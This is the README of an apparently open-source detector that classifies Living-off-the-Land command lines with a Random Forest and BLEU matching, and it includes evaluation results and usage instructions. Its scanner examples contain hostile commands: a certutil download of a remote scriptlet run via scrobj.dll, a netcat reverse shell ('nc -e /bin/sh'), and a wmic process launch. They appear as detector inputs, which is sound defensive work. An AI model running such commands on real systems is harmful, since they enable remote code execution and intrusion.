<div align="center">

# LotLDetection

### Living-off-the-Land Attacks Detection System by Machine Learning

[![Python Version](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-0078D6?style=for-the-badge&logo=windows&logoColor=white)]()
[![Model](https://img.shields.io/badge/Architecture-Random%20Forest%20%2B%20Sentence--BLEU-28A745?style=for-the-badge&logo=scikitlearn&logoColor=white)]()

---

</div>

## Overview

LotLDetection is a security framework designed to detect Living-off-the-Land techniques across Windows and Linux command lines. By abusing trusted, cryptographically signed administrative utilities such as `certutil`, `wmic`, `netsh`, `powershell`, or standard POSIX binaries, adversaries execute malicious actions while blending into legitimate enterprise administration traffic.

LotlDetection integrates rule-based semantic feature engineering, dual-view de-obfuscation, platform-calibrated Random Forest classification, and Sentence-BLEU lexical matching against authoritative threat corpora.

---

## System Workflow

The detection engine processes incoming command lines through a multi-stage hybrid pipeline:

```mermaid
flowchart LR
    A["Raw Command Line"] --> B["1. Preprocess & Normalize"]
    B --> C["2. Feature Extraction"]
    
    subgraph D ["Dual-Track Evaluation"]
        D1["Random Forest Classifier"]
        D2["Sentence-BLEU Matcher"]
    end
    
    C --> D
    D1 --> E{"4. Decision Logic"}
    D2 --> E
    
    E -->|"High Risk"| F["BAD"]
    E -->|"Low Risk & Sufficient Features"| G["GOOD"]
    E -->|"Sparse Features"| H["NEUTRAL"]

    %% Semantic Styling
    classDef bad fill:#3b181e,stroke:#f85149,stroke-width:1.5px,color:#ff7b72;
    classDef good fill:#142d1f,stroke:#2ea043,stroke-width:1.5px,color:#56d364;
    classDef neutral fill:#21262d,stroke:#8b949e,stroke-width:1px,color:#c9d1d9;

    class F bad;
    class G good;
    class H neutral;
```

### Execution Steps:
1. **Input and Normalization:** Unrolls command-line escape characters such as Windows caret, strips redundant whitespace, categorizes IPv4 addresses into private or public tiers, and tokenizes command components.
2. **Feature Extraction:** Matches tokens against binary registries, sensitive system paths, and behavioral regular expressions to produce a semantic label vector.
3. **Dual-Track Evaluation:**
   - **Statistical track:** Transforms labels via `CountVectorizer` and computes malicious posterior probability using a 100-tree balanced Random Forest.
   - **Lexical track:** Computes runtime Sentence-BLEU similarity against historical attack corpora.
4. **Decision Logic:** Emits an actionable verdict based on platform-calibrated risk thresholds:
   - Returns **BAD** if a Sentence-BLEU match is detected or Random Forest probability meets/exceeds the decision threshold (0.575 for Windows, 0.50 for Linux).
   - Returns **NEUTRAL** if fewer than 1 feature label is detected (insufficient observable telemetry).
   - Returns **GOOD** if sufficient feature labels are present and the probability falls below threshold.

---

## Evaluation Results

### Windows Test

```text
Test [windows]: 840 samples
              precision    recall  f1-score   support

Good/Neutral     0.9778    0.9740    0.9759       768
         Bad     0.7333    0.7639    0.7483        72

    accuracy                         0.9560       840
   macro avg     0.8556    0.8689    0.8621       840
weighted avg     0.9568    0.9560    0.9564       840

TN=748 FP=20 FN=17 TP=55
NEUTRAL=0 (including 0 BAD samples)
```

### Linux Test

```text
Test [linux]: 921 samples
              precision    recall  f1-score   support

Good/Neutral     0.9715    0.9789    0.9752       662
         Bad     0.9449    0.9266    0.9357       259

    accuracy                         0.9642       921
   macro avg     0.9582    0.9527    0.9554       921
weighted avg     0.9640    0.9642    0.9641       921

TN=648 FP=14 FN=19 TP=240
NEUTRAL=0 (including 0 BAD samples)
```

---

## Quick Start

### 1. Installation

Prerequisites: Python 3.11+

```powershell
cd D:\Github\LotLDetection
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
```

### 2. Command-Line Detection

- Interactive Console Mode:
  ```powershell
  python scripts/scan.py --platform windows
  ```
  ```text
  LotlDetection [windows] - type exit to quit
  >>> cmd.exe /c certutil.exe -urlcache -split -f http://example.com/file.sct scrobj.dll
  Prediction: BAD

  >>> exit
  ```

- Ad-Hoc Single Command Scan:
  ```powershell
  python scripts/scan.py --platform windows "wmic process call create 'cmd.exe /c whoami'"
  python scripts/scan.py --platform linux "nc -e /bin/sh 10.10.10.10 4444"
  ```

- Batch File Inspection:
  ```powershell
  python scripts/scan.py --platform windows --file telemetry_commands.txt
  ```

### 3. Model Training and Evaluation

```powershell
# Retrain model
python scripts/train.py --platform windows
python scripts/train.py --platform linux

# Evaluate on test holdout
python scripts/evaluate.py --platform windows
python scripts/evaluate.py --platform linux
```

---

## Project Structure

```text
LotlDetection/
├── README.md
├── requirements.txt
│
├── data/
│   ├── raw/
│   │   ├── windows.csv             # 8,308 curated Windows LotL samples
│   │   └── linux.csv               # 8,709 curated Linux LotL samples
│   ├── external/
│   │   ├── cmd_known.corpus        # 60 Windows reference commands
│   │   └── bash_known.corpus       # 33 Linux reference commands
│   └── features/
│       ├── windows/train.csv       # Windows feature matrix (7,477 rows x 701 features)
│       └── linux/train.csv         # Linux feature matrix (7,838 rows x 956 features)
│
├── models/
│   ├── windows/
│   │   ├── rf_classifier.joblib    # Random Forest model
│   │   ├── vectorizer.joblib       # CountVectorizer vocabulary mapping
│   │   └── feature_config.json     # Configuration hashes and threshold metadata
│   └── linux/
│       ├── rf_classifier.joblib    # Random Forest model
│       ├── vectorizer.joblib       # CountVectorizer vocabulary mapping
│       └── feature_config.json     # Configuration hashes and threshold metadata
│
├── scripts/
│   ├── scan.py                     # Command-line scanner
│   ├── train.py                    # Model training pipeline
│   └── evaluate.py                 # Holdout test set evaluation script
│
└── src/
    ├── config.py                   # Hyperparameters, paths, and calibrated thresholds
    ├── data.py                     # Ingestion, stratified splitting, and sparse matrix export
    ├── evaluation.py               # Classification reporting and confusion matrix routines
    ├── features/                   # Feature extraction modules
    │   ├── label_generators.py     # Regex and keyword label extractors
    │   ├── pipeline.py             # Feature pipeline orchestrator
    │   ├── rules_constants.py      # Binary dictionaries, path constants, and rules
    │   └── similarity.py           # Sentence-BLEU n-gram similarity engine
    ├── models/
    │   ├── predictor.py            # Inference engine and decision logic
    │   └── trainer.py              # Random Forest training engine
    └── preprocessing/              # Text normalization
        ├── normalizer.py           # Caret unmasking and IPv4 extraction
        └── tokenizer.py            # Windows CMD and POSIX tokenizers
```

---

## References

1. LOLBAS Project: https://lolbas-project.github.io
2. GTFOBins Project: https://gtfobins.github.io
3. CISA Advisory AA24-038A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a
4. Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
5. libLOL: Machine Learning and Feature Engineering for Detecting Living off the Land Attacks, IoTBDS, 2022.

---

<div align="center">
  <sub>LotlDetection is an open-source cybersecurity project developed for enterprise threat detection and academic research. Licensed under Apache 2.0.</sub>
</div>
